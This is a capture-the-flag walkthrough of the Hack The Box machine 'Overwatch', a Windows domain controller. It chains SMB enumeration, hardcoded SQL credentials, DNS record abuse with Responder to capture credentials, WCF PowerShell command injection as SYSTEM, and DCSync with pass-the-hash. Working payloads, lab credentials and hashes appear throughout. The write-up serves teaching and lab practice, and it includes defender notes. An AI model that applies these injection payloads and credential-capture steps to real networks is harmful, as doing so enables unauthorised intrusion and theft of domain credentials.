# HTB: Overwatch Walkthrough

>  **Difficulty:** Medium | **OS:** Windows (Server 2022) | **Released:** 24 Jan 2026 | **Retired:** 09 May 2026 **Creator:** xct | **Hostname:** S200401 | **Domain:** overwatch.htb

---

## HTB: Overwatch Summary

Overwatch is a Medium-rated Windows Domain Controller that chains several well-chosen techniques into a satisfying attack path. The entry point is anonymous SMB access to a `software$` share hosting a custom `.NET` monitoring application. Reverse engineering the binary in DotPeek reveals hardcoded SQL Server credentials and a Windows Communication Foundation (WCF) service exposing a PowerShell command injection sink. The SQL credentials authenticate to an MSSQL instance on a non-standard port, where enumeration reveals a linked server pointing to a hostname that does not exist in DNS. Because `sqlsvc` holds `CREATE_CHILD` on the AD-integrated DNS zone, an arbitrary DNS A record can be added pointing that missing hostname to the attacker's machine, causing Responder to capture the linked server's outbound cleartext SQL authentication — yielding the `sqlmgmt` user's password and a WinRM shell. From there, the locally-bound WCF service's `KillProcess` endpoint is exploited via PowerShell command injection running as `nt authority\system`, demonstrated across four distinct interaction methods. Root is achieved by adding `sqlmgmt` to the Administrators group and performing a DCSync.

---

## 01 · Recon

### Nmap

```bash
# Fast full port scan
sudo nmap -p- -vvv --min-rate 10000 10.129.244.81

# Service/version scan on key ports
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -sCV 10.129.244.81
```

**Open ports — standard DC profile plus two non-standard additions:**

|Port|Service|Notes|
|---|---|---|
|53|DNS|Standard DC port|
|88|Kerberos|Standard DC port|
|135, 139|MSRPC / NetBIOS|Standard DC ports|
|389 / 636|LDAP / LDAPS|Domain: `overwatch.htb`|
|445|SMB|Signing required; Guest + Null Auth enabled|
|464|kpasswd5|Standard DC port|
|3268 / 3269|Global Catalog|Standard DC ports|
|3389|RDP|`CN=S200401.overwatch.htb`; Build 20348 = Server 2022|
|**5985**|WinRM|Target for lateral movement|
|**6520**|MSSQL 2022|Non-standard port — priority target|
|9389|ADWS / .NET Message Framing|Standard DC port|

All ports show TTL of 127, confirming Windows one hop away. The clock skew is only 4 seconds — below the Kerberos 5-minute threshold, so no time sync is needed before Kerberos-authenticated operations.

Port 6520 running MSSQL on a Domain Controller is unusual and immediately flagged as a priority. The RDP TLS certificate `CN=S200401.overwatch.htb` confirms the hostname. Port 9389 showing `.NET Message Framing` is consistent with Active Directory Web Services (ADWS), another standard DC component.

### Hosts File and Initial Checks

```bash
# Generate and prepend hosts entry
netexec smb 10.129.244.81 --generate-hosts-file hosts
cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
# 10.129.244.81   S200401.overwatch.htb overwatch.htb S200401

# Verify clock skew (< 5 minutes = no ntpdate needed)
# If > 5 minutes: sudo ntpdate S200401.overwatch.htb
```

The `netexec` output confirms `Null Auth:True` and `Guest Auth:True`, meaning unauthenticated share enumeration is possible — the first thing to check.

---

## 02 · SMB Enumeration — software$ Share

### Share Listing

Guest authentication with any username and a blank password successfully lists shares. Among the standard DC shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`), there is a non-standard share named `software$` with READ access. Non-standard shares on Domain Controllers almost always contain something interesting — this one hosts a custom monitoring application.

```bash
netexec smb 10.129.244.81 -u guest -p '' --shares
```

### Spider and Download All Files

The `spider_plus` netexec module recursively enumerates and downloads all accessible files in one command. It filters out large files (>50KB by default) and certain extension types, but the interesting content here is well within limits.

```bash
netexec smb 10.129.244.81 -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True
mv ~/.nxc/modules/nxc_spider_plus/10.129.244.81/software\$ software
find software/ -type f
# software/Monitoring/overwatch.exe.config
# software/Monitoring/overwatch.pdb
# software/Monitoring/overwatch.exe
# software/Monitoring/Microsoft.Management.Infrastructure.dll
```

### Configuration File Analysis

`overwatch.exe.config` is a standard .NET XML configuration file and reveals several important details before the binary is even opened. The WCF service model section shows a `MonitoringService` hosted at `http://overwatch.htb:8000/MonitorService` using `basicHttpBinding` with no transport security or authentication configured — meaning if the port is reachable, calls can be made without credentials. The `serviceMetadata httpGetEnabled="True"` setting means the WSDL is published at `?wsdl`, so the full service contract (every method, parameter, and return type) is discoverable just by fetching that URL. The `serviceDebug includeExceptionDetailInFaults="True"` setting means any server-side exception will leak its full .NET stack trace in the SOAP response, which is useful for understanding how payloads are being processed and for error-based oracles when shaping injection payloads.

The two Entity Framework providers — `SqlClient` (for the remote SQL Server on port 6520) and `SQLite.EF6` (for a local SQLite file) — indicate the application talks to two separate data stores, one remote and one local. The remote one is clearly the MSSQL instance already identified on port 6520.

Port 8000 is not accessible from outside (it does not appear in the nmap results), indicating it is either firewalled or bound to localhost only. This is an attack surface to revisit once a foothold is established on the box.

---

## 03 · .NET Binary Analysis — overwatch.exe

### Identifying the Binary

```bash
file software/Monitoring/overwatch.exe
# PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows, 2 sections
```

The `.NET assembly` identification means the binary can be cleanly decompiled back to readable C# using tools like **DotPeek** (JetBrains, Windows GUI), **ilspycmd** (cross-platform CLI), or **dnSpy**. The `.pdb` (program database) symbol file is also present, which means decompiled output will include original variable and method names rather than the obfuscated single-character names that appear when symbols are stripped.

### Program Structure (DotPeek)

The decompiled code sits in two classes: `Program` and `MonitoringService`. The `Main` function starts the WCF service host, starts a 30-second recurring timer that calls `CheckEdgeHistory`, then blocks waiting for user input:

```csharp
ServiceHost serviceHost = new ServiceHost(typeof(MonitoringService), Array.Empty<Uri>());
serviceHost.Open();
Console.WriteLine("Service is running...");
Timer timer = new Timer(30000.0);
timer.Elapsed += new ElapsedEventHandler(Program.CheckEdgeHistory);
timer.Start();
Console.ReadLine();
serviceHost.Close();
```

### Hardcoded SQL Credentials in CheckEdgeHistory

The `CheckEdgeHistory` function is a timer callback that copies recent Edge browser history entries into the remote SQL Server's `EventLog` table. The function opens a SQLite connection to a copy of the Edge History file and an MSSQL connection using a hardcoded connection string embedded directly in the source code:

```csharp
using (SqlConnection sqlConnection = new SqlConnection(
    "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"))
```

This is the critical credential leak. `sqlsvc` with password `TI0LKcfHzZw1Vv` authenticates to the local MSSQL instance. The function also contains an unsanitised SQL string build using concatenation of URL values from Edge history — a secondary SQL injection vulnerability, though not the path to exploitation in this box.

### MonitoringService WCF Contract — KillProcess Injection Sink

`MonitoringService` implements the `IMonitoringService` WCF contract and exposes three operations: `StartMonitoring()`, `StopMonitoring()`, and `KillProcess(string processName)`. The constructor stores the same MSSQL connection string for use by the monitoring operations. The `KillProcess` method is the critical finding for privilege escalation:

```csharp
public string KillProcess(string processName)
{
    string scriptContents = "Stop-Process -Name " + processName + " -Force";
    using (Runspace runspace = RunspaceFactory.CreateRunspace())
    {
        runspace.Open();
        using (Pipeline pipeline = runspace.CreatePipeline())
        {
            pipeline.Commands.AddScript(scriptContents);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> collection = pipeline.Invoke();
            // return output as string
        }
    }
}
```

The `processName` parameter is concatenated directly into a PowerShell script string and executed via a `Runspace` pipeline. PowerShell uses semicolons as statement separators and `#` to begin inline comments, so a `processName` of `x; whoami #` produces the script `Stop-Process -Name x; whoami # -Force` — two statements where `Stop-Process` fails silently (process `x` doesn't exist), `whoami` executes, and `# -Force` is treated as a comment and ignored. This is a textbook command injection sink in a WCF service.

Because the service runs as `LocalSystem` (confirmed later from the NSSM registry entry), this injection produces command execution as `nt authority\system`.

---

## 04 · MSSQL Enumeration — Linked Server Discovery

### Credential Validation

```bash
netexec mssql 10.129.244.81 --port 6520 -u sqlsvc -p TI0LKcfHzZw1Vv
# [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

### Connect and Enumerate

```bash
mssqlclient.py overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -p 6520 -windows-auth
```

The session opens with `sqlsvc` mapped to the `guest` role on `master`, indicating no explicit user mapping in `master` and a fallback to the low-privilege guest account. Switching to the `overwatch` database elevates the mapping to `dbo@overwatch` because `sqlsvc` owns that database.

```sql
-- List databases
SQL> enum_db
-- Finds: master, tempdb, model, msdb, overwatch (only non-standard one)

-- Switch to overwatch database
SQL> use overwatch;
-- SQL (OVERWATCH\sqlsvc  dbo@overwatch)>

-- Only table: Eventlog (empty)
SQL> select name from sys.tables;   -- Eventlog
SQL> select * from EventLog;        -- empty

-- No impersonation opportunities
SQL> enum_impersonate   -- empty

-- Logins: sa (disabled), BUILTIN\Users, OVERWATCH\sqlsvc
SQL> enum_logins
```

### Linked Server Discovery — SQL07

Enumerating linked servers reveals a critical finding: a linked server named `SQL07` pointing to a data source also named `SQL07`:

```sql
SQL> enum_links
-- SRV_NAME: SQL07, SRV_DATASOURCE: SQL07, SQLNCLI provider
```

Attempting to use the linked server immediately times out with a DNS resolution failure — the host `SQL07` does not exist in the domain's DNS:

```sql
SQL> use_link [SQL07]
-- OLE DB provider "MSOLEDBSQL": Login timeout expired
-- A network-related error has occurred... Server is not found or not accessible
-- Named Pipes Provider: Could not open a connection to SQL Server [53]
```

The same timeout occurs for direct `EXEC ... AT [SQL07]` calls. This is a deliberately broken linked server — the DNS record for SQL07 was never created (or was deleted), so the connection attempt fails before authentication can happen.

### Confirming SQL07 Does Not Exist in DNS

```bash
nslookup SQL07.overwatch.htb S200401.overwatch.htb
# ** server can't find SQL07.overwatch.htb: NXDOMAIN

nslookup SQL07 S200401.overwatch.htb
# SERVFAIL — the DC can't even find a short-name resolution

# For comparison, the DC itself resolves fine:
nslookup S200401.overwatch.htb S200401.overwatch.htb
# Name: S200401.overwatch.htb, Address: 10.129.244.81
```

LDAP enumeration of computer objects confirms that SQL07 is not registered as a domain computer — there is an SQL03, but no SQL07. The linked server configuration likely refers to a decommissioned server whose DNS and AD computer account were cleaned up but whose linked server definition was never removed from S200401's SQL instance.

```bash
ldapsearch -x -H ldap://overwatch.htb -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' \
  -b 'DC=overwatch,DC=htb' '(&(objectClass=computer)(!(name=S200401)))' name
# Returns: SQL03, NB001, NB002, File01, S200400 — no SQL07
```

### sqlsvc ACL Enumeration — CREATE_CHILD on DNS Zone

`bloodyAD`'s `get writable` command enumerates all AD objects the current user has write-type permissions on. The two meaningful results are `CREATE_CHILD` permissions on both the `overwatch.htb` DNS zone in `DomainDnsZones` and the `_msdcs.overwatch.htb` zone in `ForestDnsZones`:

```bash
bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv get writable
# distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
# permission: CREATE_CHILD
# distinguishedName: DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb
# permission: CREATE_CHILD
```

`CREATE_CHILD` on an AD-integrated DNS zone container means the principal can create new `dnsNode` objects (DNS records) within that zone — effectively the ability to add arbitrary DNS A, AAAA, CNAME, or other records to zones that the DC itself resolves. This is the AD-integrated DNS equivalent of being a `DnsAdmins` group member for those specific zones, but achieved through a direct ACL grant rather than group membership, making it harder to detect via standard group-based auditing.

---

## 05 · AD-Integrated DNS Abuse → Responder → sqlmgmt Credentials

### Why This Works

When the SQL Server on S200401 tries to connect to the `SQL07` linked server, it performs a DNS lookup for the hostname. Because `SQL07` currently has no DNS record, the lookup fails and the connection never starts. If an attacker creates a DNS A record for `SQL07.overwatch.htb` pointing to their own machine before triggering a linked server connection attempt, the DNS lookup will succeed and the SQL Server will attempt to authenticate to the attacker's machine instead of the real SQL07. The key question is what type of authentication the linked server uses. If it uses Windows authentication (Kerberos or NTLM), the attacker receives an NTLM hash that requires cracking. If it uses SQL Server authentication (a stored username and password in the linked server login mapping), those credentials travel inside the TDS protocol with only trivial obfuscation — effectively cleartext — and Responder's built-in MSSQL listener decodes them automatically.

### Step 1 — Add the DNS Record

```bash
bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord SQL07 10.10.14.61
# [+] SQL07 has been successfully added

# Verify propagation (takes a few seconds)
nslookup SQL07.overwatch.htb S200401.overwatch.htb
# Name: SQL07.overwatch.htb
# Address: 10.10.14.61
```

### Step 2 — Start Responder and Trigger the Linked Server

```bash
# Start Responder on the tun0 interface
sudo uv run /opt/Responder/Responder.py -I tun0
```

Then from the `mssqlclient.py` session, trigger the linked server connection:

```sql
SQL> use_link [SQL07]
-- (hangs while SQL Server attempts to connect to 10.10.14.61)
```

Responder captures the inbound connection and decodes the TDS login packet:

```
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

The credentials are captured in cleartext because the linked server login mapping uses SQL Server authentication — a stored username and password transmitted inside the TDS `LOGIN7` packet. TDS applies only a trivial obfuscation to the password (nibble-swap each byte and XOR with `0xA5`), which is fully reversible and functionally equivalent to cleartext on the wire. Responder implements this decode automatically. If the linked server had been configured to use Windows authentication (pass-through or impersonation), the outbound connection would have carried an NTLM negotiation instead, and only an NTLM hash would be captured — requiring a separate cracking step. SQL auth is both simpler for the attacker and worse for the defender in this scenario.

---

## 06 · Shell as sqlmgmt via WinRM

### Confirm Group Membership

A quick LDAP query confirms `sqlmgmt` is a member of `Remote Management Users`, which is the group that controls WinRM access:

```bash
ldapsearch -x -H ldap://overwatch.htb -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' \
  -b 'DC=overwatch,DC=htb' '(sAMAccountName=sqlmgmt)' memberOf
# memberOf: CN=Remote Management Users,CN=Builtin,DC=overwatch,DC=htb
```

```bash
netexec winrm S200401.overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
# [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

```bash
evil-winrm-py -i S200401.overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
# evil-winrm-py PS C:\Users\sqlmgmt\Desktop> cat user.txt
```

---

## 07 · Post-Exploitation Enumeration

### Filesystem

The root of `C:\` is clean with one critical finding: a hidden directory `C:\Software` (attribute `d--h--`, not shown by default `ls`). Always use `ls -force` on Windows to see hidden items:

```powershell
ls -force C:\
# d--h-- C:\Software   (hidden application directory)
```

```powershell
ls -force C:\Software\Monitoring
# All files carry hidden attribute (d--h-- / -a-h--)
# overwatch.exe, overwatch.exe.config, overwatch.pdb, EntityFramework DLLs,
# System.Data.SQLite DLLs, System.Management.Automation.dll
```

The presence of `System.Management.Automation.dll` alongside the application confirms it uses PowerShell automation (the `Runspace`-based `KillProcess` implementation seen in the source code), and that this specific version of the DLL is bundled with the application rather than using the system's PowerShell installation.

### NSSM Service Registration

The `overwatch.exe` process is registered as a Windows service via NSSM (Non-Sucking Service Manager) with `ObjectName: LocalSystem`, meaning the process runs as `NT AUTHORITY\SYSTEM`. Querying the registry confirms this:

```powershell
# Find NSSM-backed services
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' |
  Where-Object { (Get-ItemProperty $_.PSPath).ImagePath -like '*nssm*' }
# Returns: overwatch, ObjectName: LocalSystem

# Get the application path
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters'
# Application: C:\Software\Monitoring\overwatch.exe
```

### WCF Service on Port 8000 — http.sys Verification

The WCF service is confirmed to be running and bound to port 8000:

```powershell
Get-Process overwatch
# PID: 4668

Get-NetTCPConnection -State Listen -LocalPort 8000 | Select LocalAddress, LocalPort, OwningProcess
# LocalAddress: 0.0.0.0 / ::, LocalPort: 8000, OwningProcess: 4
```

The owning process is PID 4 (the kernel `System` process) rather than PID 4668 (`overwatch.exe`). This is exactly correct for a .NET WCF service using `basicHttpBinding`: the service does not hold the socket directly. Instead, it registers a URL prefix with `http.sys` (Windows' kernel-mode HTTP listener), which holds the socket as part of the kernel and dispatches incoming requests upward to the registered user-mode process. PID 4 owning port 8000 is therefore not a sign of something unexpected — it is the normal state for any `http.sys`-hosted service.

`netsh http show servicestate` provides the complete live picture of what `http.sys` is currently dispatching:

```powershell
netsh http show servicestate
# Registered URL: HTTP://+:8000/MONITORSERVICE/
# Attached process: ID 4668 (overwatch.exe)
```

The `+` wildcard in the registered URL means any `Host` header value is accepted, so the service is reachable at `http://localhost:8000/MonitorService/`, `http://127.0.0.1:8000/MonitorService/`, or the box's hostname — all reach the same WCF handler. This means the WinRM shell as `sqlmgmt` can interact with the service directly from the box using localhost URLs.

---

## 08 · WCF KillProcess — Command Injection as SYSTEM (4 Methods)

### Injection Pattern

Recall from the source code that `KillProcess` builds its PowerShell command by simple string concatenation:

```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```

PowerShell interprets `;` as a statement separator and `#` as a line comment. Therefore a `processName` of `x; <COMMAND> #` produces:

```powershell
Stop-Process -Name x; <COMMAND> # -Force
```

`Stop-Process -Name x` fails silently (no process named `x`), `<COMMAND>` executes in the SYSTEM context, and `# -Force` is discarded as a comment. For privilege escalation the most useful command is `net localgroup Administrators sqlmgmt /add`, which adds the current user to the local Administrators group and permits a full administrative WinRM session and DCSync.

---

### Method 1 — PowerShell Raw SOAP via `Invoke-WebRequest`

The most direct approach requires no additional tooling — just crafting the SOAP XML envelope manually and POSTing it with `Invoke-WebRequest` (alias `iwr`) from the existing WinRM shell. The SOAP envelope must specify the `SOAPAction` header to identify which contract method is being called:

```powershell
$s='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>x; net localgroup Administrators sqlmgmt /add</processName></KillProcess></s:Body></s:Envelope>'

(iwr 'http://localhost:8000/MonitorService/' -Method POST `
  -ContentType 'text/xml; charset=utf-8' `
  -Headers @{'SOAPAction'='"http://tempuri.org/IMonitoringService/KillProcess"'} `
  -Body $s -UseBasicParsing).Content
# Returns: <KillProcessResult>The command completed successfully.</KillProcessResult>
```

To verify execution context first:

```powershell
# processName = "x; whoami #"
# Returns: <KillProcessResult>nt authority\system</KillProcessResult>
```

This method requires knowing the SOAP envelope structure, the `SOAPAction` header value, and the `xmlns` namespace — all available from the WSDL at `http://localhost:8000/MonitorService?wsdl` or from the `overwatch.exe.config` file. The method is completely self-contained and leaves no files on disk.

---

### Method 2 — PowerShell WebServiceProxy

`New-WebServiceProxy` parses the WSDL and generates a dynamic proxy object that wraps all the underlying HTTP/SOAP complexity, exposing the WCF contract methods as native PowerShell methods. This is significantly simpler than crafting raw SOAP:

```powershell
$proxy = New-WebServiceProxy -Uri "http://localhost:8000/MonitorService?wsdl" -Namespace "WcfProxy"
$proxy.KillProcess('x; net localgroup administrators sqlmgmt /add; #')
# The command completed successfully.
```

The proxy automatically constructs the correct SOAP envelope, sets the correct `SOAPAction` header, serialises the parameters, and deserialises the response. The `?wsdl` endpoint is published because `serviceMetadata httpGetEnabled="True"` was set in the config file, which is what makes this approach possible without any prior knowledge of the SOAP format. This is the fastest interactive method — two lines of PowerShell from within the WinRM shell.

---

### Method 3 — WCF Inline Client via `Add-Type`

`Add-Type` compiles and loads C# code dynamically at runtime within the current PowerShell session, without requiring any files on disk or external build tools. By defining the `IMonitoringService` interface and a `ChannelFactory`-based client class inline, a typed WCF client can be instantiated and called directly:

```powershell
$src = 'using System.ServiceModel;
[ServiceContract(Namespace="http://tempuri.org/")]
public interface IMonitoringService {
    [OperationContract] string KillProcess(string processName);
}
public static class Client {
    public static string Run(string p) {
        var f = new ChannelFactory<IMonitoringService>(
            new BasicHttpBinding(),
            new EndpointAddress("http://localhost:8000/MonitorService/"));
        return f.CreateChannel().KillProcess(p);
    }
}'

Add-Type -TypeDefinition $src -ReferencedAssemblies System.ServiceModel
[Client]::Run('x; whoami #')
# nt authority\system
```

This approach demonstrates a proper WCF typed client — the same pattern used in production .NET applications to consume WCF services — instantiated on-the-fly without needing Visual Studio or the `svcutil.exe` tool to generate proxy classes ahead of time. The `-ReferencedAssemblies System.ServiceModel` flag makes the WCF libraries available to the compiled code. This method is entirely in-memory and leaves no artifacts.

---

### Method 4 — WCF Binary Client (Compiled .exe)

The most production-style approach is to write a proper C# WCF client, compile it on the attacking machine, upload it to the target, and execute it there. This mirrors how a developer would normally consume a WCF service:

**client.cs (on attacker machine):**

```csharp
using System;
using System.ServiceModel;

[ServiceContract(Namespace = "http://tempuri.org/")]
public interface IMonitoringService {
    [OperationContract] string KillProcess(string processName);
}

class Program {
    static void Main(string[] args) {
        var binding = new BasicHttpBinding();
        var endpoint = new EndpointAddress("http://localhost:8000/MonitorService/");
        using (var factory = new ChannelFactory<IMonitoringService>(binding, endpoint)) {
            var client = factory.CreateChannel();
            Console.WriteLine(client.KillProcess("x; " + args[0] + " #"));
        }
    }
}
```

```powershell
# Upload and compile on target using the box's own .NET compiler
evil-winrm-py PS C:\programdata> wget 10.10.14.61/client.cs -outfile client.cs
evil-winrm-py PS C:\programdata> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe `
  /r:System.ServiceModel.dll /out:client.exe client.cs

# Execute with any command
.\client.exe "whoami"
# nt authority\system

# Read root flag directly
.\client.exe "Get-Content C:\users\administrator\desktop\root.txt"
# f263ec97************************
```

The compiled binary wraps the injection prefix (`x;` ) and suffix ( `#`) automatically, so `args[0]` is passed clean. This method is useful when more complex commands or scripts need to be passed — the binary handles encoding and transport, while the command itself can be anything that runs from PowerShell.

---

## 09 · Shell as Administrator

### Method 1 — Add sqlmgmt to Administrators and Reconnect WinRM

After running any of the four exploitation methods with `net localgroup Administrators sqlmgmt /add`, reconnect WinRM — the new session will have the `BUILTIN\Administrators` group token active at high mandatory level:

```bash
evil-winrm-py -i S200401.overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
# whoami /groups → BUILTIN\Administrators — Mandatory group, Enabled by default
```

### Method 2 — DCSync via secretsdump

With `sqlmgmt` in the Administrators group, the account now has the replication rights needed for DCSync (via the DRSUAPI method):

```bash
secretsdump.py overwatch/sqlmgmt:bIhBbzMMnB82yx@S200401.overwatch.htb -just-dc-user administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:269fa056205bbf5d47fc2c3682dbbce6:::
# aes256-cts-hmac-sha1-96:2f3c0c1b2c6b7640c5aa32aefa9ae4876b90f3111bddcc4e3d6a6abae8c18320
```

### Method 3 — Pass-the-Hash as Administrator

```bash
evil-winrm-py -i S200401.overwatch.htb -u administrator -H 269fa056205bbf5d47fc2c3682dbbce6
# evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
```

---

## 10 · Beyond Root — DISM Log Password Leak

The Windows Deployment Image Servicing and Management (DISM) log at `C:\Windows\Logs\DISM\dism.log` records a header for every session that loads `DismApi.dll`. One of the header fields is the **parent process command line** — the full command that launched the process calling DISM. Because HTB's pre-release setup scripts called DISM functions (like `Get-WindowsFeature`, `Add-WindowsCapability`, or `Get-WindowsOptionalFeature`) while passing the Administrator password on the command line — for example, to install features, configure roles, or run PowerShell scripts as Administrator — those command lines were written verbatim into the DISM log, including the plaintext password.

DISM log format: Each session is bracketed by `<----- Starting DismApi.dll session ----->` and a matching `Ending` marker. The forensically interesting field is:

```
Parent process command line: "C:\Program Files\Windows Defender\MpCmdRun.exe" -Roles
```

or in the HTB-specific case, something containing the Administrator password passed as a `-Password` parameter to a PowerShell script. Because DISM does not filter or redact command line arguments before logging them, any credentials in the parent command line are preserved in the log.

**Forensic implication:** `C:\Windows\Logs\DISM\dism.log` is a standard Windows log that defenders rarely audit for credential exposure. In any environment where administrators run DISM-touching commands (`Get-WindowsFeature`, `Enable-WindowsOptionalFeature`, `DISM.exe`) while passing passwords on the command line (common in automated provisioning scripts), those passwords may be recoverable from the DISM log even long after the provisioning is complete — the log is persistent and not routinely cleared.

```powershell
# Read the DISM log and search for command lines
Select-String -Path C:\Windows\Logs\DISM\dism.log -Pattern "Parent process command line"
# Or look for password-related content
Select-String -Path C:\Windows\Logs\DISM\dism.log -Pattern "password|Password|credential" -CaseSensitive:$false
```

---

## Key Concepts & Analyst Notes

### AD-Integrated DNS — CREATE_CHILD Privilege Escalation

AD-integrated DNS zones are stored as objects in Active Directory under `CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>`. The DNS server on the Domain Controller reads and writes these objects via LDAP rather than maintaining separate zone files. The `CREATE_CHILD` extended right on these zone containers allows a principal to create new child objects — specifically `dnsNode` objects (DNS records). Any domain principal with this right can register arbitrary DNS entries that the DC's DNS server will answer authoritatively.

```bash
# Enumerate DNS write rights on all principals
bloodyAD --host <DC> -u <user> -p <pass> get writable | grep -A2 "DNS"

# Add an A record
bloodyAD --host <DC> -u <user> -p <pass> add dnsRecord <HOSTNAME> <ATTACKER_IP>

# Verify the record
nslookup <HOSTNAME>.<DOMAIN> <DC>

# Remove the record (cleanup)
bloodyAD --host <DC> -u <user> -p <pass> del dnsRecord <HOSTNAME> <ATTACKER_IP>
```

This is particularly powerful in combination with MSSQL linked servers, Exchange servers making outbound connections, or any service that performs DNS-based resource discovery — if the target hostname doesn't resolve, adding a record redirects the connection to the attacker. Defenders should audit `CREATE_CHILD` permissions on AD DNS zone containers regularly, as this right is frequently granted to service accounts that need to self-register DNS entries but carries significantly more privilege than intended.

---

### MSSQL Linked Server Authentication — SQL Auth vs Windows Auth

Linked servers in SQL Server support two authentication modes for outbound connections: Windows authentication (Kerberos or NTLM, using the SQL Server service account or a configured login) and SQL Server authentication (a stored username and password transmitted in the TDS login packet). The critical difference for defenders and attackers is what happens when an attacker captures that outbound connection:

|Auth Type|Captured By Responder|Cracking Required|Wire Exposure|
|---|---|---|---|
|SQL Server auth|Plaintext username + password|None — immediately usable|Trivially obfuscated (nibble-swap + XOR 0xA5)|
|Windows auth (NTLM)|NTLMv2 challenge/response hash|Yes — requires offline cracking|Cryptographically secure challenge/response|
|Windows auth (Kerberos)|TGS ticket (if delegation configured)|Varies|Depends on service ticket encryption|

When a linked server is configured with SQL auth (via `sp_addlinkedsrvlogin` with explicit credentials), those credentials travel in the TDS `LOGIN7` packet with only the trivial obfuscation. Responder decodes this automatically, making linked servers with SQL auth credentials a reliable cleartext credential recovery path whenever the target hostname can be controlled via DNS.

---

### WCF Service Interaction Methods — Summary

|Method|Tooling Required|Files on Disk|Ease of Use|Best For|
|---|---|---|---|---|
|Raw SOAP via `iwr`|None (built-in PowerShell)|No|Medium — must know SOAP format|Quick PoC from WinRM shell|
|`New-WebServiceProxy`|None (built-in PowerShell)|No|Easy — two lines|Fastest interactive exploitation|
|`Add-Type` inline client|None (built-in PowerShell)|No|Medium — more code|In-memory typed client, no external files|
|Compiled binary `.exe`|`csc.exe` (on target)|Yes — .cs and .exe|Lowest — requires file upload|Complex commands, repeatable use|

All four methods produce identical results. The WSDL (`?wsdl`) is the prerequisite for understanding the contract when source code is not available — always check `serviceMetadata httpGetEnabled` in the config or try `http://<host>:<port>/<service>?wsdl` as a first step when encountering unknown WCF endpoints.

---

### NSSM Service — Privilege Context Audit

NSSM (Non-Sucking Service Manager) is a legitimate tool that wraps arbitrary executables as Windows services. When found on a server, it almost always indicates custom applications have been registered as services. Key information to extract:

```powershell
# Find all NSSM-backed services
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' |
  Where-Object { (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).ImagePath -like '*nssm*' }

# For each found service, check the application and privilege context
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\<name>\Parameters'
# Application: the actual binary being wrapped
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\<name>'
# ObjectName: the account the service runs as (LocalSystem, NetworkService, or a specific account)
```

`ObjectName: LocalSystem` means the wrapped application runs as `NT AUTHORITY\SYSTEM`. Any vulnerability in that application (command injection, path traversal, DLL hijacking) translates directly to SYSTEM-level code execution.

---

### Quick Reference — Key Commands

|Task|Command|
|---|---|
|Generate hosts file|`netexec smb <IP> --generate-hosts-file hosts`|
|Spider and download SMB share|`netexec smb <IP> -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True`|
|Validate MSSQL creds|`netexec mssql <IP> --port <PORT> -u <USER> -p <PASS>`|
|Connect to MSSQL|`mssqlclient.py domain/user:pass@host -p PORT -windows-auth`|
|Enumerate MSSQL linked servers|`enum_links`|
|Check AD write permissions|`bloodyAD --host <DC> -u <u> -p <p> get writable`|
|Add DNS A record|`bloodyAD --host <DC> -u <u> -p <p> add dnsRecord <NAME> <IP>`|
|Verify DNS record|`nslookup <NAME>.<DOMAIN> <DC>`|
|Start Responder|`sudo python Responder.py -I tun0`|
|Trigger linked server|`use_link [SQL07]` (from mssqlclient)|
|WinRM shell|`evil-winrm-py -i <HOST> -u <USER> -p <PASS>`|
|Find hidden directories|`ls -force C:\`|
|Find NSSM services|`Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' \| Where-Object { (Get-ItemProperty $_.PSPath).ImagePath -like '*nssm*' }`|
|Check http.sys state|`netsh http show servicestate`|
|WCF via WebServiceProxy|`$p = New-WebServiceProxy -Uri "http://localhost:PORT/Service?wsdl"; $p.Method(args)`|
|Add user to Administrators|`net localgroup Administrators <user> /add`|
|DCSync (admin needed)|`secretsdump.py domain/user:pass@host -just-dc-user administrator`|
|Pass the hash|`evil-winrm-py -i <HOST> -u administrator -H <NTLM_HASH>`|

---
